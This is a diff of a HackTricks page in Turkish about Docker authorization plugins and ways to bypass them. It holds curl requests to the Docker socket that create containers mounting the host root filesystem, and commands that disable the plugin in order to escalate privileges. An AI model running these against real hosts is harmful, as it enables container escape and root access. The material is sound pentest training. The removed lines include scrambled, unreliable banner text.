@@ -1,32 +1,28 @@
-{% hnnt styte=" acceas" %}
-GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
-Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dotsilp>
+<details>
 
-<oummpr>SupportHackTricks</smmay>
+<summary>Support HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
-* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
 
 
-**Docker’ın** kutudan çıktığı gibi **yetkilendirme** modeli **ya hepsi ya hiçbiri** şeklindedir. Docker daemon’a erişim izni olan herhangi bir kullanıcı, **herhangi bir** Docker istemci **komutunu** **çalıştırabilir**. Bu, Docker’ın Engine API’sini kullanarak daemon’a ulaşan çağrılar için de geçerlidir. Eğer **daha fazla erişim kontrolü** gerekiyorsa, **yetkilendirme eklentileri** oluşturabilir ve bunları Docker daemon yapılandırmanıza ekleyebilirsiniz. Bir yetkilendirme eklentisi kullanarak, bir Docker yöneticisi Docker daemon’a erişimi yönetmek için **ayrıntılı erişim** politikaları **yapılandırabilir**.
+**Docker’ın** kutudan çıktığı gibi **yetkilendirme** modeli **ya hepsi ya hiçbiri** şeklindedir. Docker daemon'a erişim iznine sahip herhangi bir kullanıcı, **herhangi bir** Docker istemci **komutunu** **çalıştırabilir**. Docker’ın Engine API'sini kullanarak daemon ile iletişim kuran çağrıcılar için de aynı şey geçerlidir. Eğer **daha fazla erişim kontrolü** gerekiyorsa, **yetkilendirme eklentileri** oluşturabilir ve bunları Docker daemon yapılandırmanıza ekleyebilirsiniz. Bir yetkilendirme eklentisi kullanarak, bir Docker yöneticisi Docker daemon'a erişimi yönetmek için **ayrıntılı erişim** politikaları **yapılandırabilir**.
 
 # Temel mimari
 
-Docker Auth eklentileri, **kullanıcı** tarafından talep edilen **hareketleri** Docker Daemon’a **izin verme/red etme** amacıyla kullanabileceğiniz **harici** **eklenti**lerdir.
+Docker Auth eklentileri, **kullanıcı** tarafından talep edilen **hareketleri** **izin verme/red etme** amacıyla Docker Daemon'a iletilen **harici** **eklenti**lerdir.
 
 **[Aşağıdaki bilgi belgelerden alınmıştır](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Bir **HTTP** **isteği**, CLI aracılığıyla veya Engine API’si üzerinden Docker **daemon**’ına yapıldığında, **kimlik doğrulama** **alt sistemi** isteği yüklü **kimlik doğrulama** **eklenti**(ler)ine **gönderir**. İstek, kullanıcı (çağrıcı) ve komut bağlamını içerir. **Eklenti**, isteği **izin verme** veya **red etme** kararı vermekten sorumludur.
+Bir **HTTP** **isteği**, CLI aracılığıyla veya Engine API üzerinden Docker **daemon**'a yapıldığında, **kimlik doğrulama** **alt sistemi** isteği yüklü **kimlik doğrulama** **eklenti**(ler)ine iletir. İstek, kullanıcı (çağrıcı) ve komut bağlamını içerir. **Eklenti**, isteği **izin verme** veya **red etme** kararı vermekten sorumludur.
 
 Aşağıdaki sıralama diyagramları, izin verme ve red etme yetkilendirme akışını göstermektedir:
 
@@ -34,25 +30,25 @@ Aşağıdaki sıralama diyagramları, izin verme ve red etme yetkilendirme akı�
 
 ![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-Eklentiye gönderilen her istek, **kimlik doğrulaması yapılmış kullanıcıyı, HTTP başlıklarını ve istek/yanıt gövdesini** içerir. Sadece **kullanıcı adı** ve kullanılan **kimlik doğrulama yöntemi** eklentiye iletilir. En önemlisi, **hiçbir** kullanıcı **kimlik bilgisi** veya token iletilmez. Son olarak, **tüm istek/yanıt gövdeleri** yetkilendirme eklentisine gönderilmez. Sadece `Content-Type` değeri `text/*` veya `application/json` olan istek/yanıt gövdeleri gönderilir.
+Eklentiye gönderilen her istek, **kimlik doğrulaması yapılmış kullanıcıyı, HTTP başlıklarını ve istek/yanıt gövdesini** içerir. Sadece **kullanıcı adı** ve kullanılan **kimlik doğrulama yöntemi** eklentiye iletilir. En önemlisi, **hiçbir** kullanıcı **kimlik bilgisi** veya token iletilmez. Son olarak, **tüm istek/yanıt gövdeleri** yetkilendirme eklentisine gönderilmez. Sadece `Content-Type`'ı `text/*` veya `application/json` olan istek/yanıt gövdeleri gönderilir.
 
-HTTP bağlantısını potansiyel olarak ele geçirebilecek komutlar (`HTTP Upgrade`), örneğin `exec`, için yetkilendirme eklentisi yalnızca ilk HTTP istekleri için çağrılır. Eklenti komutu onayladıktan sonra, yetkilendirme akışın geri kalanına uygulanmaz. Özellikle, akış verileri yetkilendirme eklentilerine iletilmez. Parçalı HTTP yanıtı döndüren komutlar, örneğin `logs` ve `events`, için yalnızca HTTP isteği yetkilendirme eklentilerine gönderilir.
+HTTP bağlantısını potansiyel olarak ele geçirebilecek komutlar (`HTTP Upgrade`) için, örneğin `exec`, yetkilendirme eklentisi yalnızca ilk HTTP istekleri için çağrılır. Eklenti komutu onayladıktan sonra, yetkilendirme akışın geri kalanına uygulanmaz. Özellikle, akış verileri yetkilendirme eklentilerine iletilmez. Parçalı HTTP yanıtı döndüren komutlar için, örneğin `logs` ve `events`, yalnızca HTTP isteği yetkilendirme eklentilerine gönderilir.
 
-İstek/yanıt işleme sırasında, bazı yetkilendirme akışları Docker daemon’a ek sorgular yapmayı gerektirebilir. Bu tür akışları tamamlamak için, eklentiler, normal bir kullanıcı gibi daemon API’sini çağırabilir. Bu ek sorguları etkinleştirmek için, eklenti, bir yöneticinin uygun kimlik doğrulama ve güvenlik politikalarını yapılandırması için gerekli araçları sağlamalıdır.
+İstek/yanıt işleme sırasında, bazı yetkilendirme akışları Docker daemon'a ek sorgular yapmayı gerektirebilir. Bu tür akışları tamamlamak için, eklentiler, normal bir kullanıcı gibi daemon API'sini çağırabilir. Bu ek sorguları etkinleştirmek için, eklentinin bir yöneticinin uygun kimlik doğrulama ve güvenlik politikalarını yapılandırmasını sağlaması gerekir.
 
 ## Birkaç Eklenti
 
-**Eklentinizi** Docker daemon **başlangıcı** sırasında **kaydetmekten** siz sorumlusunuz. **Birden fazla eklenti yükleyebilir ve bunları bir araya getirebilirsiniz**. Bu zincir sıralı olabilir. Daemon’a yapılan her istek, zincir boyunca sırayla geçer. **Tüm eklentiler kaynağa erişim izni verdiğinde**, erişim izni verilir.
+Eklentinizi Docker daemon **başlatma** sürecinin bir parçası olarak **kaydetmekten** siz sorumlusunuz. **Birden fazla eklenti yükleyebilir ve bunları birleştirebilirsiniz**. Bu zincir sıralı olabilir. Daemona yapılan her istek, zincir boyunca sırayla geçer. **Tüm eklentiler kaynağa erişim izni verdiğinde**, erişim izni verilir.
 
 # Eklenti Örnekleri
 
 ## Twistlock AuthZ Broker
 
-Eklenti [**authz**](https://github.com/twistlock/authz), **istekleri yetkilendirmek için** eklentinin **okuyacağı** basit bir **JSON** dosyası oluşturmanıza olanak tanır. Bu nedenle, her API uç noktasının hangi kullanıcılar tarafından erişilebileceğini çok kolay bir şekilde kontrol etme fırsatı sunar.
+Eklenti [**authz**](https://github.com/twistlock/authz), **istekleri yetkilendirmek için** eklentinin **okuyacağı** basit bir **JSON** dosyası oluşturmanıza olanak tanır. Bu nedenle, her kullanıcının hangi API uç noktalarına erişebileceğini çok kolay bir şekilde kontrol etme fırsatı sunar.
 
-Bu, Alice ve Bob’un yeni konteynerler oluşturmasına izin verecek bir örnektir: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
+Bu, Alice ve Bob'un yeni konteynerler oluşturmasına izin verecek bir örnektir: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-[route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) sayfasında, istenen URL ile eylem arasındaki ilişkiyi bulabilirsiniz. [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) sayfasında ise eylem adı ile eylem arasındaki ilişkiyi bulabilirsiniz.
+[route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) sayfasında istenen URL ile eylem arasındaki ilişkiyi bulabilirsiniz. [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) sayfasında ise eylem adı ile eylem arasındaki ilişkiyi bulabilirsiniz.
 
 ## Basit Eklenti Eğitimi
 
@@ -64,7 +60,7 @@ Nasıl çalıştığını anlamak için `README` ve `plugin.go` kodunu okuyun.
 
 ## Erişimi Belirleme
 
-Kontrol edilmesi gereken ana şeyler, **hangi uç noktaların izin verildiği** ve **hangi HostConfig değerlerinin izin verildiğidir**.
+Kontrol edilmesi gereken ana şeyler **hangi uç noktaların izin verildiği** ve **hangi HostConfig değerlerinin izin verildiğidir**.
 
 Bu belirlemeyi yapmak için **şu aracı kullanabilirsiniz** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
 
@@ -125,7 +121,8 @@ Docker API'sini [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker
 
 ### Kökte Bağlantılar
 
-Sistem yöneticisi docker güvenlik duvarını yapılandırırken [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) gibi bazı önemli parametreleri "**Binds**" unuttuğu için bu yanlış yapılandırmayı kötüye kullanarak host'un kök (/) klasörünü bağlayan ve çalıştıran bir konteyner oluşturmak mümkündür:
+Sistem yöneticisi docker güvenlik duvarını yapılandırırken [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) gibi bazı önemli parametreleri **unutmuş olabilir**. "**Binds**" gibi.\
+Aşağıdaki örnekte, bu yanlış yapılandırmayı kötüye kullanarak host'un kök (/) klasörünü bağlayan ve çalıştıran bir konteyner oluşturmak mümkündür:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -153,7 +150,7 @@ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '
 ```
 ### Mounts in HostConfig
 
-**Kökte Binds** ile aynı talimatları izleyerek bu **isteği** Docker API'sine gerçekleştirin:
+**Kökteki Binds** ile aynı talimatları izleyerek bu **isteği** Docker API'sine gerçekleştirin:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
@@ -175,7 +172,7 @@ capsh --print
 
 ## Eklentiyi Devre Dışı Bırakma
 
-Eğer **sistem yöneticisi**, **eklentiyi** **devre dışı bırakma** yetkisini **yasaklamayı** **unutmuşsa**, bunu tamamen devre dışı bırakmak için kullanabilirsiniz!
+Eğer **sistem yöneticisi** **eklentiyi** **devre dışı bırakma** yetkisini **unutmuşsa**, bunu tamamen devre dışı bırakmak için kullanabilirsiniz!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -189,30 +186,21 @@ docker plugin enable authobot
 ```
 Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!
 
-## Auth Plugin Bypass writeups
+## Auth Plugin Bypass yazıları
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-## References
-{% hnt stye="acceas" %}
-AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
-Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
+{% hint style="success" %}
+AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dtil>
+<details>
 
-<ummr>SupportHackTricks</smmay>
+<summary>HackTricks'i Destekleyin</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
-* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
 </details>
 {% endhint %}
